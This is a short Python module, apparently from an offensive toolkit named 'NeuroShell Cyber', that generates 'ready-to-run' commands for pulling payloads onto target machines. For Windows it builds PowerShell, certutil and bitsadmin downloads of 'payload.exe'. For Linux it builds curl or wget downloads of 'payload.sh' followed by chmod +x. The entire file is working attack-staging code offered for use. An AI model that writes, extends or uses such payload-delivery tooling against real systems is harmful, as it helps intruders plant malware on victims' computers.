"""
NeuroShell Cyber — Pull Command Builder module.
Synthesizes target-side download and execution commands across Windows and Linux.
"""

from __future__ import annotations

from editions.cyber.staging.http_server import PullCommands


class PullCommandBuilder:
    """Convenience wrapper for generating ready-to-run pull one-liners."""

    @staticmethod
    def for_windows(url: str, outfile: str = "payload.exe") -> dict[str, str]:
        return {
            "powershell_irm": f'powershell -c "irm {url} -OutFile {outfile}"',
            "powershell_webrequest": f'powershell -c "Invoke-WebRequest -Uri {url} -OutFile {outfile}"',
            "certutil": f"certutil.exe -urlcache -split -f {url} {outfile}",
            "bitsadmin": f"bitsadmin /transfer nJob /download /priority foreground {url} {outfile}",
        }

    @staticmethod
    def for_linux(url: str, outfile: str = "payload.sh") -> dict[str, str]:
        return {
            "curl": f"curl -sSL {url} -o {outfile} && chmod +x {outfile}",
            "wget": f"wget -q {url} -O {outfile} && chmod +x {outfile}",
        }
